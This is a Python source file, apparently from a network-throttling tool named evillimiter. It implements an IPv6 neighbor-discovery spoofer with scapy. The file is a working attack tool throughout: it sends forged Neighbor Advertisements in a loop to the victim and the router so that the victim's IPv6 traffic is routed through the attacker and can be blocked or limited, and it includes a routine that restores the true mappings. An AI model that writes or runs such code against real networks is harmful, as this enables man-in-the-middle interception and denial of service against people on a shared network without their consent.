import time
import threading

from scapy.all import Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, sendp  # pylint: disable=no-name-in-module

from evillimiter.console.io import IO


class NDPSpoofer(object):
    """
    IPv6 counterpart of the ARP spoofer.

    Poisons the neighbor caches of the target and the router with spoofed
    ICMPv6 Neighbor Advertisements so the target's IPv6 traffic is routed
    through us (the attacker), enabling block / limit over IPv6.

    Not yet wired into the menu. Interception must be verified live: phones
    rotate their temporary IPv6 addresses, so each host's address list should
    be refreshed periodically (via utils.get_host_ipv6_addresses).
    """

    def __init__(self, interface, gateway_ipv6, gateway_mac, our_mac):
        self.interface = interface
        self.gateway_ipv6 = gateway_ipv6    # router's link-local address
        self.gateway_mac = gateway_mac      # router's real MAC
        self.our_mac = our_mac              # our MAC (where traffic gets lured)

        # interval in seconds between spoofed-packet bursts
        self.interval = 2

        self._hosts = set()
        self._hosts_lock = threading.Lock()
        self._running = False

    def add(self, host):
        with self._hosts_lock:
            self._hosts.add(host)
        host.spoofed = True

    def remove(self, host, restore=True):
        with self._hosts_lock:
            self._hosts.discard(host)
        if restore:
            self._restore(host)

    def start(self):
        """
        Starts the spoof thread. Returns False if the IPv6 gateway could not
        be resolved (nothing to spoof against).
        """
        if self.gateway_ipv6 is None or self.gateway_mac is None:
            return False

        self._running = True
        thread = threading.Thread(target=self._spoof, args=[], daemon=True)
        thread.start()
        return True

    def stop(self):
        self._running = False

    def _spoof(self):
        while self._running:
            with self._hosts_lock:
                hosts = self._hosts.copy()

            for host in hosts:
                if not self._running:
                    return
                self._send_spoofed_packets(host)

            time.sleep(self.interval)

    def _na(self, dst_ip, dst_mac, target_ip, lladdr):
        """
        Builds an unsolicited Neighbor Advertisement (Override set) that claims
        `target_ip` is reachable at link-layer address `lladdr`, delivered to
        `dst_ip`/`dst_mac`.
        """
        return (
            Ether(dst=dst_mac, src=self.our_mac) /
            IPv6(src=target_ip, dst=dst_ip) /
            ICMPv6ND_NA(tgt=target_ip, R=1, S=0, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=lladdr)
        )

    def _addresses(self, host):
        return list(host.ipv6)

    def _send_spoofed_packets(self, host):
        addresses = self._addresses(host)
        if not addresses:
            return

        packets = []
        # Tell the victim that the router lives at our MAC.
        for addr in addresses:
            packets.append(self._na(addr, host.mac, self.gateway_ipv6, self.our_mac))
        # Tell the router that each of the victim's addresses lives at our MAC.
        for addr in addresses:
            packets.append(self._na(self.gateway_ipv6, self.gateway_mac, addr, self.our_mac))

        for packet in packets:
            sendp(packet, verbose=0, iface=self.interface)

    def _restore(self, host):
        """
        Re-asserts the correct mappings so the victim and router recover quickly.
        """
        addresses = self._addresses(host)
        if not addresses:
            return

        packets = []
        for addr in addresses:
            packets.append(self._na(addr, host.mac, self.gateway_ipv6, self.gateway_mac))
            packets.append(self._na(self.gateway_ipv6, self.gateway_mac, addr, host.mac))

        for packet in packets:
            sendp(packet, count=3, verbose=0, iface=self.interface)
